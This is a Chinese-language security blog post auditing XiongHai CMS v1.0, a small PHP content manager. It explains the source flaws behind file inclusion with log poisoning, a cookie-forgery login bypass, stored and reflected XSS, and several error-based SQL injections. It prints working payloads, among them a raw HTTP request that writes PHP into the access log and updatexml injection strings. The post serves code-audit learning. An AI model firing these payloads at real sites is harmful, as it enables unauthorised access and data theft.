<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> 代码审计3-熊海cms v1.0 · Uknow - Stay hungry Stay foolish</title><meta name="description" content="代码审计3-熊海cms v1.0 - uknow"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/2.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" type="text/css"></head><body><div id="mask" style="display: none;"><img id="mask-image" src="#" style=" "></div><div class="wrap"><header><a href="/" class="logo-link"><img src="/2.png"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">Blog</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">Archive</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">About</a></li><li class="nav-list-item"><a href="https://github.com/uknowsec" target="_blank" class="nav-list-link">GitHub</a></li><li class="nav-list-item"><a href="http://weibo.com/uknowsec" target="_blank" class="nav-list-link">Weibo</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">代码审计3-熊海cms v1.0</h1><div class="post-time">Sep 6, 2018</div><div class="post-content"><!-- ttoc -->
<h3><span id="qian-yan">前言</span><a href="#qian-yan" class="header-anchor">#</a></h3><p>菜狗子学代码审计，只能挑挑软柿子捏一捏了。MVC框架现在估计是审计不出来，只能找找代码流不仅小一点，小型的CMS下手了。所以找了这一套又老有小的CMS来练练手了，目前还是用<code>seay审计系统</code>先扫描可疑的漏洞点，然后一个一个地去看漏洞涉及的代码，可能菜是原罪吧。</p>
<h3><span id="xiong-hai-cms-v1-0">熊海CMS v1.0</span><a href="#xiong-hai-cms-v1-0" class="header-anchor">#</a></h3><h4><span id="ren-yi-wen-jian-bao-han">任意文件包含</span><a href="#ren-yi-wen-jian-bao-han" class="header-anchor">#</a></h4><p>在路径<code>/admin/index.php</code>中，有一段入口文件代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//单一入口模式</span><br><span class="line">error_reporting(0); //关闭错误显示</span><br><span class="line">$file=addslashes($_GET[&apos;r&apos;]); //接收文件名</span><br><span class="line">$action=$file==&apos;&apos;?&apos;index&apos;:$file; //判断为空或者等于index</span><br><span class="line">include(&apos;files/&apos;.$action.&apos;.php&apos;); //载入相应文件</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这里的变量<code>$_GET[&#39;r&#39;]</code>仅仅用<code>addslashes()</code>函数进行简单的转义，直接进行文件包含，但是在<code>include()</code>函数里拼接了<code>.php</code>后缀。所以必须要上传了<code>.php</code>文件才行。</p>
<p>手动在文件目录下创建<code>1.php</code>,用<code>r=../1</code>包含该文件，但是这个貌似有点鸡肋。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_1.jpg" alt=""></p>
<p>如果满足如下条件，就可以利用<code>%00</code>截断可以进行包含文件进行getshell</p>
<ul>
<li>PHP版本 &lt; 5.3</li>
<li>magic_quotes_gpc = off</li>
<li>没有用addslashes()进行转义处理</li>
</ul>
<p>手动把<code>PHP</code>版本调到<code>5.2.17</code>，并且把<code>magic_quotes_gpc = off</code>,去掉原来代码中的<code>addslashes()</code>函数处理进行文件包含<code>getshell</code>。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_16.jpg" alt=""></p>
<p>另外再修改代码测试一下，把拼接部分的<code>php</code>后缀去掉。然后就可以利用到包含日志文件进行<code>getshell</code>了。</p>
<p><code>Payload:r=../../../Apache/logs/access.log &lt;?php phpinfo(); ?&gt;</code></p>
<p>浏览器会对一些字符进行转义编码，用burp直接发包。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?r=../../../Apache/logs/access.log &lt;?php phpinfo(); ?&gt; HTTP/1.1</span><br><span class="line">Host: xhcms.com</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_3.jpg" alt=""></p>
<h4><span id="cookie-wei-zao-yue-quan-fang-wen">cookie伪造越权访问</span><a href="#cookie-wei-zao-yue-quan-fang-wen" class="header-anchor">#</a></h4><p>在路径<code>\inc\checklogin.php</code>的代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$user=$_COOKIE[&apos;user&apos;];</span><br><span class="line">if ($user==&quot;&quot;)&#123;</span><br><span class="line">header(&quot;Location: ?r=login&quot;);</span><br><span class="line">exit;	</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><code>checklogin.php</code>文件用来检查用户的<code>COOKIE</code>,判断仅仅是判断<code>COOKIE</code>是否不为空，所以只要我们伪造任意不为空的<code>COOKIE</code>值就可以跳过后面的重定向了。</p>
<p>在<code>\admin\files</code>目录下的所有的文件都是通过<code>require()</code>函数来包含这个文件进行COOKIE认证的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require &apos;../inc/checklogin.php&apos;;</span><br></pre></td></tr></table></figure>
<p>所以我们可以直接伪造任意不为空的<code>COOKIE</code>值来进行越权访问。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_4.jpg" alt=""></p>
<h4><span id="cun-chu-xing-xss">存储型XSS</span><a href="#cun-chu-xing-xss" class="header-anchor">#</a></h4><p>在每个文章下面是可以进行评论的，提交了一下评论表单，用<code>PHPStorm</code>调试跟进。发现评论内容是被过滤了的。</p>
<p>在文件<code>\files\submit.php</code>中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content= addslashes(strip_tags($content));//过滤HTML</span><br></pre></td></tr></table></figure>
<p>但是没有过滤其他的字段，这里仍然可以利用其他字段进行XSS攻击。</p>
<p>利用昵称进行XSS测试。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_5.jpg" alt=""></p>
<p>这里好像把页面的html也插坏了。。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_6.jpg" alt=""></p>
<p>后台管理员界面：</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_7.jpg" alt=""></p>
<h4><span id="fan-she-xing-xss">反射型XSS</span><a href="#fan-she-xing-xss" class="header-anchor">#</a></h4><p>在路径<code>\files\contact.php</code>中，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$page=addslashes($_GET[&apos;page&apos;]);</span><br><span class="line">if ($page&lt;&gt;&quot;&quot;)&#123;</span><br><span class="line">if ($page&lt;&gt;1)&#123;</span><br><span class="line">$pages=&quot;第&quot;.$page.&quot;页 - &quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这里的<code>$page</code>是直接仅仅进行了转义，然后直接代入以下的<code>html</code>代码里。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a&gt;第 &lt;?php echo $page?&gt; - &lt;?php echo $Totalpage?&gt; 页 共 &lt;?php echo $Total?&gt; 条&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<p>所以可以XSS。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_8.jpg" alt=""></p>
<h4><span id="qian-tai-duo-chu-bao-cuo-zhu-ru">前台多处报错注入</span><a href="#qian-tai-duo-chu-bao-cuo-zhu-ru" class="header-anchor">#</a></h4><h5><span id="files-software-php-bao-cuo-zhu-ru">\files\software.php报错注入</span><a href="#files-software-php-bao-cuo-zhu-ru" class="header-anchor">#</a></h5><p>在路径<code>\files\software.php</code>如下代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$query = &quot;SELECT * FROM settings&quot;;</span><br><span class="line">$resul = mysql_query($query) or die(&apos;SQL语句有误：&apos;.mysql_error());</span><br><span class="line">$info = mysql_fetch_array($resul);</span><br><span class="line">$id=addslashes($_GET[&apos;cid&apos;]);</span><br><span class="line">$query = &quot;SELECT * FROM download WHERE id=&apos;$id&apos;&quot;;</span><br><span class="line">$resul = mysql_query($query) or die(&apos;SQL语句有误：&apos;.mysql_error());</span><br><span class="line">$download = mysql_fetch_array($resul);</span><br><span class="line"></span><br><span class="line">//浏览计数</span><br><span class="line">$query = &quot;UPDATE download SET hit = hit+1 WHERE id=$id&quot;;</span><br><span class="line">@mysql_query($query) or die(&apos;修改错误：&apos;.mysql_error());</span><br></pre></td></tr></table></figure>
<p>这里的<code>cid</code>变量通过<code>GET</code>请求提交，然后通过一个<code>addslashes()</code>函数进行简单的转义，这样对注入是没有防护作用的。所以可以直接进行注入，这里是通过<code>die(&#39;SQL语句有误：&#39;.mysql_error());</code>输出报错信息，所以是属于报错注入。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_10.jpg" alt=""></p>
<h5><span id="files-content-php-bao-cuo-zhu-ru">\files\content.php报错注入</span><a href="#files-content-php-bao-cuo-zhu-ru" class="header-anchor">#</a></h5><p>在路径<code>\files\content.php</code>代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$query = &quot;SELECT * FROM settings&quot;;</span><br><span class="line">$resul = mysql_query($query) or die(&apos;SQL语句有误：&apos;.mysql_error());</span><br><span class="line">$info = mysql_fetch_array($resul);</span><br><span class="line"></span><br><span class="line">$id=addslashes($_GET[&apos;cid&apos;]);</span><br><span class="line">$query = &quot;SELECT * FROM content WHERE id=&apos;$id&apos;&quot;;</span><br><span class="line">$resul = mysql_query($query) or die(&apos;SQL语句有误：&apos;.mysql_error());</span><br><span class="line">$content = mysql_fetch_array($resul);</span><br><span class="line"></span><br><span class="line">$navid=$content[&apos;navclass&apos;];</span><br><span class="line">$query = &quot;SELECT * FROM navclass WHERE id=&apos;$navid&apos;&quot;;</span><br><span class="line">$resul = mysql_query($query) or die(&apos;SQL语句有误：&apos;.mysql_error());</span><br><span class="line">$navs = mysql_fetch_array($resul);</span><br></pre></td></tr></table></figure>
<p>这里的<code>cid</code>变量跟<code>\files\software.php</code>是一样的。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_11.jpg" alt=""></p>
<h5><span id="files-submit-php-bao-cuo-zhu-ru">\files\submit.php报错注入</span><a href="#files-submit-php-bao-cuo-zhu-ru" class="header-anchor">#</a></h5><p>在<code>\files\submit.php</code>路径下，有几处SQL注入，有跟前面一样的<code>cid</code>变量，另外还有下面的<code>mail</code>变量。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$query = &quot;SELECT * FROM interaction WHERE( mail = &apos;$mail&apos;)&quot;;</span><br><span class="line">$result = mysql_query($query) or die(&apos;SQL语句有误：&apos;.mysql_error());</span><br><span class="line">$tx = mysql_fetch_array($result);</span><br><span class="line">if (!mysql_num_rows($result))&#123;  </span><br><span class="line">$touxiang = mt_rand(1,100);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$touxiang = $tx[&apos;touxiang&apos;];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的<code>mail</code>变量是POST提交的，没有经过任何过滤，闭合单引号和括号。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;) and (updatexml(1,concat(0x7e,(select user()),0x7e),1))#</span><br></pre></td></tr></table></figure>
<p>在评论处，添加评论并在邮箱处插入payload。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_12.jpg" alt=""></p>
<p>提交返回报错信息。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_13.jpg" alt=""></p>
<h4><span id="hou-tai-bao-cuo-zhu-ru">后台报错注入</span><a href="#hou-tai-bao-cuo-zhu-ru" class="header-anchor">#</a></h4><h5><span id="admin-files-wzlist-php-bao-cuo-zhu-ru">\admin\files\wzlist.php报错注入</span><a href="#admin-files-wzlist-php-bao-cuo-zhu-ru" class="header-anchor">#</a></h5><p>后台也有不少可以进行报错注入的点，这里有一处是利用到<code>delete</code>语句的。。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$delete=$_GET[&apos;delete&apos;];</span><br><span class="line">if ($delete&lt;&gt;&quot;&quot;)&#123;</span><br><span class="line">$query = &quot;DELETE FROM content WHERE id=&apos;$delete&apos;&quot;;</span><br><span class="line">$result = mysql_query($query) or die(&apos;SQL语句有误：&apos;.mysql_error());</span><br><span class="line">echo &quot;&lt;script&gt;alert(&apos;亲，ID为&quot;.$delete.&quot;的内容已经成功删除！&apos;);location.href=&apos;?r=wzlist&apos;&lt;/script&gt;&quot;;</span><br><span class="line">exit; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接闭合单引号就可以了，这里也没对单引号进行转义的。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_17.jpg" alt="">后台的注入在这cms里来看并不是很鸡肋，因为我们结合前面得到的<code>cookie伪造越权访问</code>在没有管理员账号密码的情况下进行注入。例如：</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_18.jpg" alt=""></p>
<h5><span id="admin-files-newlink-php-bao-cuo-zhu-ru">\admin\files\newlink.php报错注入</span><a href="#admin-files-newlink-php-bao-cuo-zhu-ru" class="header-anchor">#</a></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$save=$_POST[&apos;save&apos;];</span><br><span class="line">$name=$_POST[&apos;name&apos;];</span><br><span class="line">$url=$_POST[&apos;url&apos;];</span><br><span class="line">$mail=$_POST[&apos;mail&apos;];</span><br><span class="line">$jieshao=$_POST[&apos;jieshao&apos;];</span><br><span class="line">$xs=$_POST[&apos;xs&apos;];</span><br><span class="line">$query = &quot;INSERT INTO link (name,url,mail,jieshao,xs,date) VALUES (&apos;$name&apos;,&apos;$url&apos;,&apos;$mail&apos;,&apos;jieshao&apos;,&apos;xs&apos;,now())&quot;;</span><br><span class="line">@mysql_query($query) or die(&apos;新增错误：&apos;.mysql_error());</span><br><span class="line">echo &quot;&lt;script&gt;alert(&apos;亲爱的，链接已经成功添加。&apos;);location.href=&apos;?r=linklist&apos;&lt;/script&gt;&quot;; </span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里是一个利用<code>insert</code>的报错注入，同样在页面添加友情链接。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; or  (updatexml(1,concat(0x7e,(select user()),0x7e),1)) or&apos;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_14.jpg" alt=""></p>
<p>保存得到报错信息。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_15.jpg" alt=""></p>
<h3><span id="jie-yu">结语</span><a href="#jie-yu" class="header-anchor">#</a></h3><p>其实还是一套简单的CMS，也是常见的漏洞。代码也比较简单，也没有过多的防护。这里找到的一个<code>cookie伪造越权访问</code>漏洞，这种是自动审计工具没法发现的点，所以还是需要自己去读代码的逻辑。结合这个漏洞，就可以在没有后台管理员权限的情况下进行后台的SQL注入。所以结合不同的漏洞去得到一个<code>webshell</code>是需要学习的点。</p>
</div></article></div></section><footer><div class="paginator"><a href="/posts/uncategorized/后渗透之meterpreter使用攻略.html" class="prev">PREV</a><a href="/posts/代码审计/代码审计2-ZZCMS8-1.html" class="next">NEXT</a></div><div class="copyright"><p>© 2016 - 2019 <a href="https://uknowsec.cn">uknow</a>  Stay hungry,Stay foolish.</p></div></footer></div><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-115504647-1",'auto');ga('send','pageview');</script><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?225ebcce29d319519ac7c7690425d1d4";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>